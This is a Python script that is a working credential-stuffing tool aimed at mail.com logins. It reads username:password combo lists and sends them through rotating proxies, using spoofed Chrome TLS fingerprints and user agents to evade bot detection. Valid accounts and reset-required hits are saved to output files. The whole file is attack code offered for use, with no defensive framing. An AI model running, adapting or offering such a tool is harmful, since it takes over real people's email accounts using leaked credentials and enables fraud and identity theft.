import tls_client
import random
import json
import threading
import time
import colorama
import ua_generator

config = json.load(open('./config.json', 'r'))
proxies = [proxy.strip() for proxy in open('./data/proxies.txt', 'r').readlines()]

def __get_proxy__() -> str | None: 
    if len(proxies) != 0:
       return random.choice(proxies).strip()
    return None

def __get_client_identifier__() -> str:
    return random.choice([
       'chrome_103', 
       'chrome_104', 
       'chrome_105', 
       'chrome_106', 
       'chrome_107', 
       'chrome_108'
    ])

def __get_client__() -> tls_client.Session:
    return tls_client.Session(client_identifier = __get_client_identifier__())

class Mail:
      def __init__(mail, proxy: str | None = None) -> None:
          mail.agent = ua_generator.generate(device = ('desktop'), browser = ('chrome'))
          mail.proxy = ({
             'http'  : 'http://{}'.format(proxy),
             'https' : 'http://{}'.format(proxy)} if proxy != None else None)
          mail.client = __get_client__()
          if mail.proxy != None:
             mail.client.proxies.update(mail.proxy)
          mail.data = mail.getData()

      def __construct_cookies__(mail, cookies: list | tls_client.cookies.RequestsCookieJar) -> str:
          return ' '.join('{}={};'.format(cookie.name, cookie.value) for cookie in cookies)
        
      def __construct_headers__(mail, headers: dict = {}) -> dict:
          return {
             'Accept-Encoding': 'gzip, deflate, br',
             'Accept-Language': 'en-US,en;q=0.9',
             'sec-ch-ua': mail.agent.ch.brands,
             'sec-ch-ua-mobile': mail.agent.ch.mobile,
             'sec-ch-ua-platform': mail.agent.ch.platform,
             'User-Agent': mail.agent.text,
            **headers
          }

      def getData(mail) -> tls_client.response.Response:
          return mail.client.get('https://www.mail.com', headers = mail.__construct_headers__({
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
             'Connection': 'keep-alive',
             'Host': 'www.mail.com',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'none'
          }))

      def signIn(mail, username: str, password: str) -> tls_client.response.Response:
          return mail.client.post('https://login.mail.com/login', headers = mail.__construct_headers__({
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
             'Connection': 'keep-alive',
             'Content-Type': 'application/x-www-form-urlencoded',
             'Cookie': mail.__construct_cookies__(mail.data.cookies),
             'Host': 'login.mail.com',
             'Origin': 'https:/www.mail.com',
             'Referer': 'https://www.mail.com/',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'same-site'
          }), data = {
             'ibaInfo': 'abd=true', 
             'service': 'mailint',
             'statistics': mail.data.text.split('name="statistics"')[1].split('"')[1],
             'uasServiceID': 'mc_starter_mailcom',
             'successURL': 'https://$(clientName)-$(dataCenter).mail.com/login',
             'loginFailedURL': 'https://www.mail.com/logout/?ls=wd',
             'loginErrorURL': 'https://www.mail.com/logout/?ls=te',
             'edition': 'us',
             'lang': 'en',
             'usertype': 'standard',
             'username': username,
             'password': password
          })

def __main__(combo: str) -> None:
    try:
      mail = Mail(__get_proxy__())
      username, password = (
         combo.split(':')[0],
         combo.split(':')[1]
      )
      response = mail.signIn(username, password)
      if response.headers.get('Location') == 'https://www.mail.com/logout/?ls=wd':
         print(f'{colorama.Style.BRIGHT}{colorama.Fore.RED}*{colorama.Style.RESET_ALL} {username}:{password}')
      else:
         if 'https://interception-lxa.mail.com' in str(response.headers.get('Location')):
            print(f'{colorama.Style.BRIGHT}{colorama.Fore.LIGHTGREEN_EX}*{colorama.Style.RESET_ALL} {username}:{password} (RESET_PASSWORD)')
            open('./data/output/hits-reset.txt', 'a+').write(f'{username}:{password}\n')
         else:
            if 'https://navigator-lxa.mail.com/login' in str(response.headers.get('Location')):
               print(f'{colorama.Style.BRIGHT}{colorama.Fore.LIGHTGREEN_EX}*{colorama.Style.RESET_ALL} {username}:{password}')
               open('./data/output/hits.txt', 'a+').write(f'{username}:{password}\n')
    except Exception as E:
           print(f'{colorama.Style.BRIGHT}{colorama.Fore.YELLOW}?{colorama.Style.RESET_ALL} {type(E)}: {str(E)}')

for combo in open('./data/combos.txt', 'r').readlines():
    threading.Thread(target = __main__, args = (combo.strip(), )).start()
    time.sleep(config['delay'])

while True: 
    time.sleep(config['delay'])
